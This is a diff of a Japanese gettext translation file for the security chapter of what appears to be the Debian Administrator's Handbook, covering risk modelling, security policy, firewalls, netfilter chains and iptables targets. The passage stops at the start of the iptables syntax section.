@@ -6,7 +6,7 @@ msgid ""
 msgstr ""
 "Project-Id-Version: 0\n"
 "POT-Creation-Date: 2013-12-30 17:37+0100\n"
-"PO-Revision-Date: 2015-06-17 21:00+0900\n"
+"PO-Revision-Date: 2015-06-24 20:52+0900\n"
 "Last-Translator: AYANOKOUZI, Ryuunosuke <i38w7i3@yahoo.co.jp>\n"
 "Language-Team: Japanese\n"
 "Language: ja\n"
@@ -52,534 +52,534 @@ msgstr "<emphasis>CAUTION</emphasis> この章の適用範囲"
 #. Tag: para
 #, no-c-format
 msgid "Security is a vast and very sensitive subject, so we cannot claim to describe it in any kind of comprehensive manner in the course of a single chapter. We will only delineate a few important points and describe some of the tools and methods that can be of use in the security domain. For further reading, literature abounds, and entire books have been devoted to the subject. An excellent starting point would be <citetitle>Linux Server Security</citetitle> by Michael D. Bauer (published by O'Reilly)."
-msgstr ""
+msgstr "セキュリティは広い意味を持っておりとても慎重に扱うべき話題です。このため、単一の章の中でいかなる種類の包括的なやり方を説明することはできません。この章では、幾つかの重要な点を詳しく説明し、幾つかのツールとセキュリティ分野で使うことが可能な方法を説明するだけにとどめます。より詳しい情報を得るには、セキュリティだけを取り扱っている沢山の文献があります。Michael D. Bauer さんが書かれた <citetitle>Linux Server Security</citetitle> (O'Reilly から出版されています) は素晴らしい足掛かりとなるでしょう。"
 
 #. Tag: para
 #, no-c-format
 msgid "The word “security” itself covers a vast range of concepts, tools and procedures, none of which apply universally. Choosing among them requires a precise idea of what your goals are. Securing a system starts with answering a few questions. Rushing headlong into implementing an arbitrary set of tools runs the risk of focusing on the wrong aspects of security."
-msgstr ""
+msgstr "「セキュリティ」という単語自体は広い範囲の概念、ツール、手順を意味しており、どの一つをとってみても普遍的に適用できるものではありません。これらを選択するには、自分の目標に関する正確な知識を必要とします。システムを保護することは幾つかの質問に答えることから始まります。何も考えずいい加減に選んだツール群を使うと、間違ったセキュリティの側面に注力するという危険を冒すことになります。"
 
 #. Tag: para
 #, no-c-format
 msgid "The very first thing to determine is therefore the goal. A good approach to help with that determination starts with the following questions:"
-msgstr ""
+msgstr "このため、まず最初に目標を決定します。目標設定を手助けするには、以下の質問に答えると良いでしょう:"
 
 #. Tag: para
 #, no-c-format
 msgid "<emphasis>What</emphasis> are we trying to protect? The security policy will be different depending on whether we want to protect computers or data. In the latter case, we also need to know which data."
-msgstr ""
+msgstr "<emphasis>何を</emphasis>保護したいのですか? セキュリティポリシーは、コンピュータを保護したい場合とデータを保護したい場合とで、異なります。データを保護したい場合、保護したいデータの種類を知る必要があります。"
 
 #. Tag: para
 #, no-c-format
 msgid "What are we trying to protect <emphasis>against</emphasis>? Is it leakage of confidential data? Accidental data loss? Revenue loss caused by disruption of service?"
-msgstr ""
+msgstr "<emphasis>何から</emphasis>保護したいのですか? 機密データの漏洩から? 予想外のデータ損失から? サービスが停止したことによる収益の損失から?"
 
 #. Tag: para
 #, no-c-format
 msgid "Also, <emphasis>who</emphasis> are we trying to protect against? Security measures will be quite different for guarding against a typo by a regular user of the system than they would be when protecting against a determined attacker group."
-msgstr ""
+msgstr "さらに、<emphasis>誰から</emphasis>保護したいのですか? システムの一般ユーザによる誤字から保護したい場合と、決定された攻撃者グループから保護したい場合とでは、必要なセキュリティ対策は全く異なるものになるでしょう。"
 
 #. Tag: para
 #, no-c-format
 msgid "The term “risk” is customarily used to refer collectively to these three factors: what to protect, what needs to be prevented from happening, and who will try to make it happen. Modeling the risk requires answers to these three questions. From this risk model, a security policy can be constructed, and the policy can be implemented with concrete actions."
-msgstr ""
+msgstr "「リスク」という用語は習慣的に、3 つの要素をまとめて意味しています: 保護したいのは何なのか、危険を防ぐために必要なのは何なのか、危険を引き起こすのは誰なのか。この種のリスクをモデル化するには、3 つの質問に答える必要があります。このリスクモデルから、セキュリティポリシーが構成され、セキュリティポリシーは具体的な動作を伴い履行されます。"
 
 #. Tag: title
 #, no-c-format
 msgid "<emphasis>NOTE</emphasis> Permanent questioning"
-msgstr ""
+msgstr "<emphasis>NOTE</emphasis> 永久的な質問"
 
 #. Tag: para
 #, no-c-format
 msgid "Bruce Schneier, a world expert in security matters (not only computer security) tries to counter one of security's most important myths with a motto: “Security is a process, not a product”. Assets to be protected change in time, and so do threats and the means available to potential attackers. Even if a security policy has initially been perfectly designed and implemented, one should never rest on one's laurels. The risk components evolve, and the response to that risk must evolve accordingly."
-msgstr ""
+msgstr "セキュリティ分野 (コンピュータセキュリティに留まらない) における世界的専門家である Bruce Schneier さんはセキュリティの最も重要な通説に反対意見を述べようとしています。反対意見のモットーは: 「セキュリティとは過程であって、成果ではない」です。保護したい資産だけでなく、脅威や潜在的な攻撃者が使う手段も、時間経過に伴い変化します。最初にセキュリティポリシーが完璧に設計され履行されたとしても、決してその栄光に満足するべきではありません。リスクの元になる要素が増加すれば、同時にリスクへの対応も増加させなければいけません。"
 
 #. Tag: para
 #, no-c-format
 msgid "Extra constraints are also worth taking into account, as they can restrict the range of available policies. How far are we willing to go to secure a system? This question has a major impact on the policy to implement. The answer is too often only defined in terms of monetary costs, but the other elements should also be considered, such as the amount of inconvenience imposed on system users or performance degradation."
-msgstr ""
+msgstr "他にも考慮に値する追加的な質問があります。この質問により、利用可能なポリシーの範囲を狭めることが可能です。どの程度までシステムを保護したいのですか? この質問はポリシーの設計に大きな影響を与えます。この質問には、金銭的な費用の意味だけでなく、システムユーザに課される不便さや性能の低下の量という別の要素も考慮して回答すべきです。"
 
 #. Tag: para
 #, no-c-format
 msgid "Once the risk has been modeled, one can start thinking about designing an actual security policy."
-msgstr ""
+msgstr "リスクのモデル化が完了したら、実際のセキュリティポリシーの設計について検討を開始することが可能です。"
 
 #. Tag: title
 #, no-c-format
 msgid "<emphasis>NOTE</emphasis> Extreme policies"
-msgstr ""
+msgstr "<emphasis>NOTE</emphasis> 極端なポリシー"
 
 #. Tag: para
 #, no-c-format
 msgid "There are cases where the choice of actions required to secure a system is extremely simple."
-msgstr ""
+msgstr "システムを保護するために必要な動作を極めて単純に選ぶことが可能な場合があります。"
 
 #. Tag: para
 #, no-c-format
 msgid "For instance, if the system to be protected only comprises a second-hand computer, the sole use of which is to add a few numbers at the end of the day, deciding not to do anything special to protect it would be quite reasonable. The intrinsic value of the system is low. The value of the data is zero since they are not stored on the computer. A potential attacker infiltrating this “system” would only gain an unwieldy calculator. The cost of securing such a system would probably be greater than the cost of a breach."
-msgstr ""
+msgstr "例えば、保護されるシステムが 1 台の中古コンピュータから構成されるとします。このシステムの唯一の使われ方は、毎日の終わりに幾つかの数の足し算を行うだけです。このようなシステムを特別に保護しないことはかなり理に適っています。本質的なシステムの価値は低いです。データの価値もありません。なぜならデータはコンピュータに保存されていないからです。この「システム」に侵入されたところで、潜在的な攻撃者が手に入れられるのは大きすぎて扱いにくい計算機だけです。このようなシステムの場合、保護に必要な費用は侵害によって脅かされる費用よりも多いかもしれません。"
 
 #. Tag: para
 #, no-c-format
 msgid "At the other end of the spectrum, we might want to protect the confidentiality of secret data in the most comprehensive way possible, trumping any other consideration. In this case, an appropriate response would be the total destruction of these data (securely erasing the files, shredding of the hard disks to bits, then dissolving these bits in acid, and so on). If there is an additional requirement that data must be kept in store for future use (although not necessarily readily available), and if cost still isn't a factor, then a starting point would be storing the data on iridium–platinum alloy plates stored in bomb-proof bunkers under various mountains in the world, each of which being (of course) both entirely secret and guarded by entire armies…"
-msgstr ""
+msgstr "その対極に、可能な限り包括的な方法を使って機密データの機密性を考え得る他のどんな方法よりも強力に保護したいとします。この場合の適切な方針は機密データを完全に破壊することです (安全にファイルを削除し、ハードディスクを粉々に破砕し、破片を酸に溶かす、などです)。追加的な要求としてデータを将来使えるように保存する必要があり (もちろん、簡単に利用できる必要はありません)、さらに保存にかかる費用に糸目をつけない場合、データをイリジウムプラチナ合金板に保存し、この板を世界中の幾つかの山の下にある防弾掩体壕の内部に保存し、各保存場所を (もちろん) 完全に秘密かつ軍隊の全員で警備する…ことが適切な方針です。"
 
 #. Tag: para
 #, no-c-format
 msgid "Extreme though these examples may seem, they would nevertheless be an adequate response to defined risks, insofar as they are the outcome of a thought process that takes into account the goals to reach and the constraints to fulfill. When coming from a reasoned decision, no security policy is less respectable than any other."
-msgstr ""
+msgstr "これらの例は極端な対応に見えますが、到達させたい目標と満足させたい制限事項を考慮した結果この対応を取ったというのであれば、定義されたリスクに対する適切な応答と言えます。合理的な判定を下した結果ならば、他のセキュリティポリシーよりも軽んじても良いセキュリティポリシーなど存在しません。"
 
 #. Tag: para
 #, no-c-format
 msgid "In most cases, the information system can be segmented in consistent and mostly independent subsets. Each subsystem will have its own requirements and constraints, and so the risk assessment and the design of the security policy should be undertaken separately for each. A good principle to keep in mind is that a short and well-defined perimeter is easier to defend than a long and winding frontier. The network organization should also be designed accordingly: the sensitive services should be concentrated on a small number of machines, and these machines should only be accessible via a minimal number of check-points; securing these check-points will be easier than securing all the sensitive machines against the entirety of the outside world. It is at this point that the usefulness of network filtering (including by firewalls) becomes apparent. This filtering can be implemented with dedicated hardware, but a possibly simpler and more flexible solution is to use a software firewall such as the one integrated in the Linux kernel."
-msgstr ""
+msgstr "殆どの場合、情報システムを一貫性のある独立した小集団に分割することが可能です。各サブシステムには独自の要求と制限事項があります。このため、リスク評価とセキュリティポリシーの設計はそれぞれのサブシステム毎に別々に実行されるべきです。覚えておくべき良い原理は、簡潔に上手く定義された境界を定義するほうが、複雑に曲がりくねった境界を定義するよりも、簡単という原理です。ネットワーク組織もまた適切に設計されるべきです: 機密を取り扱うサービスは少数のマシンに集中させるべきで、それらのマシンへのアクセスを可能にするチェックポイントの数を最小限に留めるべきです; これらのチェックポイントを守ることは、外の世界全体から全ての機密を取り扱うマシンを守ることよりも簡単です。現在、ネットワークフィルタ (ファイヤーウォールを含めて) の実用性が明らかになりつつあります。ネットワークフィルタは専用ハードウェアを使って実装されることも可能ですが、Linux カーネルに統合されているソフトウェアファイヤーウォールを使えばより簡単で柔軟性の高いフィルタを作成することが可能です。"
 
 #. Tag: title
 #, no-c-format
 msgid "Firewall or Packet Filtering"
-msgstr ""
+msgstr "ファイヤーウォールとパケットフィルタリング"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary>firewall</primary>"
-msgstr ""
+msgstr "<primary>ファイヤーウォール</primary>"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary>packet filter</primary>"
-msgstr ""
+msgstr "<primary>パケットフィルタ</primary>"
 
 #. Tag: title
 #, no-c-format
 msgid "<emphasis>BACK TO BASICS</emphasis> Firewall"
-msgstr ""
+msgstr "<emphasis>BACK TO BASICS</emphasis> ファイヤーウォール"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary>packet</primary><secondary>IP</secondary>"
-msgstr ""
+msgstr "<primary>パケット</primary><secondary>IP</secondary>"
 
 #. Tag: para
 #, no-c-format
 msgid "A <emphasis>firewall</emphasis> is a piece of computer equipment with hardware and/or software that sorts the incoming or outgoing network packets (coming to or from a local network) and only lets through those matching certain predefined conditions."
-msgstr ""
+msgstr "<emphasis>ファイヤーウォール</emphasis> はハードウェアかソフトウェアの形で提供されるコンピュータ部品の一種で、受信および送信する (ローカルネットワークに到着したり、ローカルネットワークから送信される) ネットワークパケットを仕分けて事前に定義された条件に一致するパケットだけを通過させるものです。"
 
 #. Tag: para
 #, no-c-format
 msgid "A firewall is a filtering network gateway and is only effective on packets that must go through it. Therefore, it can only be effective when going through the firewall is the only route for these packets."
-msgstr ""
+msgstr "ファイヤーウォールはネットワークゲートウェイをフィルタするもので、ゲートウェイを通過しなければいけないパケットだけに有効です。それ故、ファイヤーウォールはパケットにとってファイヤーウォールが唯一の経路である場合だけに有効です。"
 
 #. Tag: para
 #, no-c-format
 msgid "The lack of a standard configuration (and the “process, not product” motto) explains the lack of a turn-key solution. There are, however, tools that make it simpler to configure the <emphasis>netfilter</emphasis> firewall, with a graphical representation of the filtering rules. <command>fwbuilder</command> is undoubtedly among the best of them."
-msgstr ""
+msgstr "標準的な設定が存在しないということは (そして「過程であって、成果ではない」モットーに従うということは) ややこしい初期設定の不要な解決策が存在しないということを意味します。しかしながら、<emphasis>netfilter</emphasis> ファイヤーウォールの設定を簡単に行うためのツールが存在し、ツールはフィルタリングルールをグラフィカルに表現する機能を備えています。<command>fwbuilder</command> がこの種のツールの中で最良のツールであることは疑いありません。"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary><emphasis>netfilter</emphasis></primary>"
-msgstr ""
+msgstr "<primary><emphasis>netfilter</emphasis></primary>"
 
 #. Tag: title
 #, no-c-format
 msgid "<emphasis>SPECIFIC CASE</emphasis> Local Firewall"
-msgstr ""
+msgstr "<emphasis>SPECIFIC CASE</emphasis> ローカルファイヤーウォール"
 
 #. Tag: para
 #, no-c-format
 msgid "A firewall can be restricted to one particular machine (as opposed to a complete network), in which case its role is to filter or limit access to some services, or possibly to prevent outgoing connections by rogue software that a user could, willingly or not, have installed."
-msgstr ""
+msgstr "ファイヤーウォールを使って (完全なネットワークとは対照的に) 特定のマシンを制限することも可能です。この場合のファイヤーウォールの役割は、一部のサービスへのアクセスをフィルタしたり制限すること、好むと好まざるとにかかわらずユーザがインストールできる不正ソフトウェアによる外部への接続を防ぐこと、です。"
 
 #. Tag: para
 #, no-c-format
 msgid "The Linux kernel embeds the <emphasis>netfilter</emphasis> firewall. It can be controlled from user-space with the <command>iptables</command> and <command>ip6tables</command> commands. The difference between these two commands is that the former acts on the IPv4 network, whereas the latter acts on IPv6. Since both network protocol stacks will probably be around for many years, both tools will need to be used in parallel."
-msgstr ""
+msgstr "Linux カーネルには <emphasis>netfilter</emphasis> ファイヤーウォールが組み込まれています。<command>iptables</command> と <command>ip6tables</command> コマンドを使うことで、<emphasis>netfilter</emphasis> ファイヤーウォールをユーザ空間から制御することが可能です。<command>iptables</command> と <command>ip6tables</command> コマンドの違いは、<command>iptables</command> が IPv4 ネットワークを取り扱うのに対し、<command>ip6tables</command> は IPv6 ネットワークを取り扱うという点です。おそらく IPv4 と IPv6 のネットワークプロトコルスタックは長きに渡り共存するでしょうから、両方のツールを並行して実行する必要があります。"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary><command>iptables</command></primary>"
-msgstr ""
+msgstr "<primary><command>iptables</command></primary>"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary><command>ip6tables</command></primary>"
-msgstr ""
+msgstr "<primary><command>ip6tables</command></primary>"
 
 #. Tag: title
 #, no-c-format
 msgid "Netfilter Behavior"
-msgstr ""
+msgstr "netfilter の挙動"
 
 #. Tag: para
 #, no-c-format
 msgid "<emphasis>netfilter</emphasis> uses four distinct tables which store rules regulating three kinds of operations on packets:"
-msgstr ""
+msgstr "<emphasis>netfilter</emphasis> は 4 種類の異なるテーブルを使います。テーブルには、パケットに対する3 種類の操作を規制するためのルールを保存します:"
 
 #. Tag: para
 #, no-c-format
 msgid "<literal>filter</literal> concerns filtering rules (accepting, refusing or ignoring a packet);"
-msgstr ""
+msgstr "<literal>filter</literal> はフィルタリングルール (パケットを受け入れる、拒否する、無視するなど) に関係します;"
 
 #. Tag: para
 #, no-c-format
 msgid "<literal>nat</literal> concerns translation of source or destination addresses and ports of packages; note that this table only exists for IPv4;"
-msgstr ""
+msgstr "<literal>nat</literal> はパケットの送信元や宛先アドレスおよびポート番号の変換に関係します; このテーブルは IPv4 だけに存在することに注意してください;"
 
 #. Tag: para
 #, no-c-format
 msgid "<literal>mangle</literal> concerns other changes to the IP packets (including the ToS — <emphasis>Type of Service</emphasis> — field and options);"
-msgstr ""
+msgstr "<literal>mangle</literal> は IP パケットに対するその他の変換にに関係します (ToS - <emphasis>Type of Service</emphasis> - フィールドやオプションを含みます);"
 
 #. Tag: para
 #, no-c-format
 msgid "<literal>raw</literal> allows other manual modifications on packets before they reach the connection tracking system."
-msgstr ""
+msgstr "<literal>raw</literal> を使うことで、パケットが接続追跡システムに到達する前にパケットを手作業で別の変更を加える事が可能です。"
 
 #. Tag: para
 #, no-c-format
 msgid "Each table contains lists of rules called <emphasis>chains</emphasis>. The firewall uses standard chains to handle packets based on predefined circumstances. The administrator can create other chains, which will only be used when referred to by one of the standard chains (either directly or indirectly)."
-msgstr ""
+msgstr "それぞれのテーブルには、<emphasis>チェイン</emphasis>と呼ばれるルールのリストが含まれます。ファイヤーウォールは事前に定義された状況に基いてパケットを取り扱うために標準的なチェインを使います。管理者は他のチェインを作成することが可能です。このチェインを使うには、標準的なチェインの 1 つから (直接的か間接的かのいずれか一方の方法で) このチェインを参照します。"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary>chain</primary>"
-msgstr ""
+msgstr "<primary>チェイン</primary>"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary>filtering rule</primary>"
-msgstr ""
+msgstr "<primary>フィルタリングルール</primary>"
 
 #. Tag: para
 #, no-c-format
 msgid "The <literal>filter</literal> table has three standard chains:"
-msgstr ""
+msgstr "<literal>filter</literal> テーブルは 3 種類の標準的なチェインを備えています:"
 
 #. Tag: para
 #, no-c-format
 msgid "<literal>INPUT</literal>: concerns packets whose destination is the firewall itself;"
-msgstr ""
+msgstr "<literal>INPUT</literal>: 宛先がファイヤーウォール自身のパケットに関係します;"
 
 #. Tag: para
 #, no-c-format
 msgid "<literal>OUTPUT</literal>: concerns packets emitted by the firewall;"
-msgstr ""
+msgstr "<literal>OUTPUT</literal>: ファイヤーウォールから送信されたパケットに関係します;"
 
 #. Tag: para
 #, no-c-format
 msgid "<literal>FORWARD</literal>: concerns packets transiting through the firewall (which is neither their source nor their destination)."
-msgstr ""
+msgstr "<literal>FORWARD</literal>: ファイヤーウォールを通過するパケットに関係します (ファイヤーウォールはパケットの送信元でも宛先でもありません)。"
 
 #. Tag: para
 #, no-c-format
 msgid "The <literal>nat</literal> table also has three standard chains:"
-msgstr ""
+msgstr "<literal>nat</literal> テーブルも 3 種類のの標準的なチェインを備えています:"
 
 #. Tag: para
 #, no-c-format
 msgid "<literal>PREROUTING</literal>: to modify packets as soon as they arrive;"
-msgstr ""
+msgstr "<literal>PREROUTING</literal>: パケットの到着後すぐにパケットを修正します;"
 
 #. Tag: para
 #, no-c-format
 msgid "<literal>POSTROUTING</literal>: to modify packets when they are ready to go on their way;"
-msgstr ""
+msgstr "<literal>POSTROUTING</literal>: パケットを宛先に送信する準備が完了した時にパケットを修正します;"
 
 #. Tag: para
 #, no-c-format
 msgid "<literal>OUTPUT</literal>: to modify packets generated by the firewall itself."
-msgstr ""
+msgstr "<literal>OUTPUT</literal>: ファイヤーウォールそれ自身によって生成されたパケットを修正します。"
 
 #. Tag: title
 #, no-c-format
 msgid "How <emphasis>netfilter</emphasis> chains are called"
-msgstr ""
+msgstr "<emphasis>netfilter</emphasis> チェインの呼び出される方法"
 
 #. Tag: para
 #, no-c-format
 msgid "Each chain is a list of rules; each rule is a set of conditions and an action to execute when the conditions are met. When processing a packet, the firewall scans the appropriate chain, one rule after another; when the conditions for one rule are met, it “jumps” (hence the <literal>-j</literal> option in the commands) to the specified action to continue processing. The most common behaviors are standardized, and dedicated actions exist for them. Taking one of these standard actions interrupts the processing of the chain, since the packet's fate is already sealed (barring an exception mentioned below):"
-msgstr ""
+msgstr "各チェインはルールのリストです; 各ルールは一連の条件とその条件に一致する場合に実行される動作です。パケットを処理する場合、ファイヤーウォールは適切なチェインを 1 つづつ検査します; あるルールの条件に一致したら、処理を続けるために特定の動作に「ジャンプ」します(このためコマンドには <literal>-j</literal> オプションが存在します)。最も一般的な挙動は標準化されており、それぞれの挙動に対する専用の動作が存在します。標準的な動作が選択されると、チェインの処理は中止されます。なぜなら、パケットの運命は既に決まっているからです (以下で言及されている除外に一致しなければ):"
 
 #. Tag: title
 #, no-c-format
 msgid "<emphasis>BACK TO BASICS</emphasis> ICMP"
-msgstr ""
+msgstr "<emphasis>BACK TO BASICS</emphasis> ICMP"
 
 #. Tag: para
 #, no-c-format
 msgid "ICMP (<emphasis>Internet Control Message </emphasis>Protocol) is the protocol used to transmit complementary information on communications. It allows testing network connectivity with the <command>ping</command> command (which sends an ICMP <emphasis>echo request</emphasis> message, which the recipient is meant to answer with an ICMP <emphasis>echo reply</emphasis> message). It signals a firewall rejecting a packet, indicates an overflow in a receive buffer, proposes a better route for the next packets in the connection, and so on. This protocol is defined by several RFC documents; the initial RFC777 and RFC792 were soon completed and extended. <ulink type=\"block\" url=\"http://www.faqs.org/rfcs/rfc777.html\" /><ulink type=\"block\" url=\"http://www.faqs.org/rfcs/rfc792.html\" />"
-msgstr ""
+msgstr "ICMP (<emphasis>Internet Control Message </emphasis>Protocol) は通信に関する補足情報を送信するために使われるプロトコルです。<command>ping</command> コマンドは ICMP を使ってネットワークの接続性を検査します (<command>ping</command> コマンドは ICMP <emphasis>echo request</emphasis> メッセージを送信します。これに対して受信者は ICMP <emphasis>echo reply</emphasis> メッセージで応答することになっています)。ICMP を使えば、パケットがファイヤーウォールによって拒否されたことを通知したり、受信バッファが溢れていることを通知したり、次回パケット以降に使えるより良い経路を提案することが可能です。このプロトコルは幾つかの RFC 文書で定義されています; 最初の RFC777 と RFC792 はすぐに完成し、拡張されました。<ulink type=\"block\" url=\"http://www.faqs.org/rfcs/rfc777.html\" /><ulink type=\"block\" url=\"http://www.faqs.org/rfcs/rfc792.html\" />"
 
 #. Tag: para
 #, no-c-format
 msgid "For reference, a receive buffer is a small memory zone storing data between the time it arrives from the network and the time the kernel handles it. If this zone is full, new data cannot be received, and ICMP signals the problem, so that the emitter can slow down its transfer rate (which should ideally reach an equilibrium after some time)."
-msgstr ""
+msgstr "参考までに、受信バッファとは、データがネットワークから到着してカーネルがデータを処理するまでの間、そのデータを保存する小容量のメモリ領域です。このメモリ領域が満杯になると、新しいデータを受け取ることができなくなり、ICMP がこの問題を通知します。そうすれば送信側はデータの転送速度を遅くする事が可能です (理想的に言えば、暫くの後に転送速度は平衡状態に達するべきです)。"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary>ICMP</primary>"
-msgstr ""
+msgstr "<primary>ICMP</primary>"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary>Internet Control Message Protocol</primary>"
-msgstr ""
+msgstr "<primary>Internet Control Message Protocol</primary>"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary>receive buffer</primary>"
-msgstr ""
+msgstr "<primary>receive buffer</primary>"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary>buffer</primary><secondary>receive buffer</secondary>"
-msgstr ""
+msgstr "<primary>バッファ</primary><secondary>受信バッファ</secondary>"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary><command>ping</command></primary>"
-msgstr ""
+msgstr "<primary><command>ping</command></primary>"
 
 #. Tag: para
 #, no-c-format
 msgid "Note that although an IPv4 network can work without ICMP, ICMPv6 is strictly required for an IPv6 network, since it combines several functions that were, in the IPv4 world, spread across ICMPv4, IGMP (<emphasis>Internet Group Membership Protocol</emphasis>) and ARP (<emphasis>Address Resolution Protocol</emphasis>). ICMPv6 is defined in RFC4443. <ulink type=\"block\" url=\"http://www.faqs.org/rfcs/rfc4443.html\" />"
-msgstr ""
+msgstr "IPv4 ネットワークは ICMP が無くても動作しますが、IPv6 ネットワークは ICMPv6 を必須条件としています。なぜなら、ICMPv6 は IPv4 世界では ICMPv4、IGMP (<emphasis>Internet Group Membership Protocol</emphasis>)、ARP (<emphasis>Address Resolution Protocol</emphasis>) のように分散していた様々な機能をまとめているからです。ICMPv6 は RFC4443 で定義されています。<ulink type=\"block\" url=\"http://www.faqs.org/rfcs/rfc4443.html\" />"
 
 #. Tag: para
 #, no-c-format
 msgid "<literal>ACCEPT</literal>: allow the packet to go on its way;"
-msgstr ""
+msgstr "<literal>ACCEPT</literal>: 対象のパケットの通過を許可します;"
 
 #. Tag: para
 #, no-c-format
 msgid "<literal>REJECT</literal>: reject the packet with an ICMP error packet (the <literal>--reject-with <replaceable>type</replaceable></literal> option to <command>iptables</command> allows selecting the type of error);"
-msgstr ""
+msgstr "<literal>REJECT</literal>: 対象のパケットを拒否して ICMP エラーを返答します (<command>iptables</command> の <literal>--reject-with <replaceable>type</replaceable></literal> オプションを使えば返答するエラーの種類を選ぶことが可能です);"
 
 #. Tag: para
 #, no-c-format
 msgid "<literal>DROP</literal>: delete (ignore) the packet;"
-msgstr ""
+msgstr "<literal>DROP</literal>: 対象のパケットを削除 (無視) します;"
 
 #. Tag: para
 #, no-c-format
 msgid "<literal>LOG</literal>: log (via <command>syslogd</command>) a message with a description of the packet; note that this action does not interrupt processing, and the execution of the chain continues at the next rule, which is why logging refused packets requires both a LOG and a REJECT/DROP rule;"
-msgstr ""
+msgstr "<literal>LOG</literal>: 対象のパケットと一緒にメッセージをログに記録 (<command>syslogd</command> を使って) します; ログ記録が選択された場合チェインの処理は中止されない点に注意してください。チェインの実行は次のルールに進みます。このため、拒否されたパケットをログに記録するには、LOG と REJECT/DROP ルールの両方が必要です;"
 
 #. Tag: para
 #, no-c-format
 msgid "<literal>ULOG</literal>: log a message via <command>ulogd</command>, which can be better adapted and more efficient than <command>syslogd</command> for handling large numbers of messages; note that this action, like LOG, also returns processing to the next rule in the calling chain;"
-msgstr ""
+msgstr "<literal>ULOG</literal>: <command>ulogd</command> を介してメッセージをログに記録します。<command>ulogd</command> は大量のメッセージを処理する場合に <command>syslogd</command> よりも効率が良いです; LOG と同様、この場合も処理は呼び出されたチェインの次のルールに進む点に注意してください;"
 
 #. Tag: para
 #, no-c-format
 msgid "<replaceable>chain_name</replaceable>: jump to the given chain and evaluate its rules;"
-msgstr ""
+msgstr "<replaceable>chain_name</replaceable>: 指定したチェインに飛んで、チェインのルールを評価します;"
 
 #. Tag: para
 #, no-c-format
 msgid "<literal>RETURN</literal>: interrupt processing of the current chain, and return to the calling chain; in case the current chain is a standard one, there's no calling chain, so the default action (defined with the <literal>-P</literal> option to <command>iptables</command>) is executed instead;"
-msgstr ""
+msgstr "<literal>RETURN</literal>: 現在のチェインの処理を中止し、呼び出されたチェインに戻ります; 現在のチェインが標準的なチェインの場合、呼び出されがチェインはありませんから、代わりにデフォルトの動作 (<command>iptables</command> の <literal>-P</literal> オプションで定義された動作) が実行されます;"
 
 #. Tag: para
 #, no-c-format
 msgid "<literal>SNAT</literal> (only in the <literal>nat</literal> table, therefore only in IPv4 on <emphasis role=\"distribution\">Wheezy</emphasis> — NAT support for IPv6 appeared in the Linux 3.7 kernel): apply <emphasis>Source NAT</emphasis> (extra options describe the exact changes to apply);"
-msgstr ""
+msgstr "<literal>SNAT</literal> (<literal>nat</literal> テーブル、つまり <emphasis role=\"distribution\">Wheezy</emphasis> の IPv4 の中だけでのみ使う事が可能です - IPv6 の NAT サポートは Linux 3.7 カーネルから導入されました): <emphasis>Source NAT</emphasis> を適用します (追加オプションを使って適用する正確な変更を設定します);"
 
 #. Tag: para
 #, no-c-format
 msgid "<literal>DNAT</literal> (only in the <literal>nat</literal> table, therefore only in IPv4 on <emphasis role=\"distribution\">Wheezy</emphasis>): apply <emphasis>Destination NAT</emphasis> (extra options describe the exact changes to apply);"
-msgstr ""
+msgstr "<literal>DNAT</literal> (<literal>nat</literal> テーブル、つまり <emphasis role=\"distribution\">Wheezy</emphasis> の IPv4 の中だけでのみ使う事が可能です): <emphasis>Destination NAT</emphasis> を適用します (追加オプションを使って適用する正確な変更を設定します);"
 
 #. Tag: para
 #, no-c-format
 msgid "<literal>MASQUERADE</literal> (only in the <literal>nat</literal> table, therefore only in IPv4 on <emphasis role=\"distribution\">Wheezy</emphasis>): apply <emphasis>masquerading</emphasis> (a special case of <emphasis>Source NAT</emphasis>);"
-msgstr ""
+msgstr "<literal>MASQUERADE</literal> (<literal>nat</literal> テーブル、つまり <emphasis role=\"distribution\">Wheezy</emphasis> の IPv4 の中だけでのみ使う事が可能です): <emphasis>マスカレード</emphasis>を適用します (これは <emphasis>Source NAT</emphasis> の特別な場合です);"
 
 #. Tag: para
 #, no-c-format
 msgid "<literal>REDIRECT</literal> (only in the <literal>nat</literal> table, therefore only in IPv4 on <emphasis role=\"distribution\">Wheezy</emphasis>): redirect a packet to a given port of the firewall itself; this can be used to set up a transparent web proxy that works with no configuration on the client side, since the client thinks it connects to the recipient whereas the communications actually go through the proxy."
-msgstr ""
+msgstr "<literal>REDIRECT</literal> (<literal>nat</literal> テーブル、つまり <emphasis role=\"distribution\">Wheezy</emphasis> の IPv4 の中だけでのみ使う事が可能です): ファイヤーウォールの指定したポートに対象のパケットを転送します; これを使って、クライアント側に特別な設定をせずとも動作する透過的なウェブプロキシをセットアップすることが可能です。なぜなら、クライアントは宛先に接続していると思っていても、実際の通信はプロキシを通過しているからです。"
 
 #. Tag: para
 #, no-c-format
 msgid "Other actions, particularly those concerning the <literal>mangle</literal> table, are outside the scope of this text. The <citerefentry><refentrytitle>iptables</refentrytitle> <manvolnum>8</manvolnum></citerefentry> and <citerefentry><refentrytitle>ip6tables</refentrytitle> <manvolnum>8</manvolnum></citerefentry> have a comprehensive list."
-msgstr ""
+msgstr "その他の動作、特に <literal>mangle</literal> テーブルに関する動作、はこの本の範囲を超えています。<citerefentry><refentrytitle>iptables</refentrytitle> <manvolnum>8</manvolnum></citerefentry> と <citerefentry><refentrytitle>ip6tables</refentrytitle> <manvolnum>8</manvolnum></citerefentry> には包括的なリストが含まれています。"
 
 #. Tag: title
 #, no-c-format
 msgid "Syntax of <command>iptables</command> and <command>ip6tables</command>"
-msgstr ""
+msgstr "<command>iptables</command> と <command>ip6tables</command> の構文"
 
 #. Tag: para
 #, no-c-format
 msgid "The <command>iptables</command> and <command>ip6tables</command> commands allow manipulating tables, chains and rules. Their <literal>-t <replaceable>table</replaceable></literal> option indicates which table to operate on (by default, <literal>filter</literal>)."
-msgstr ""
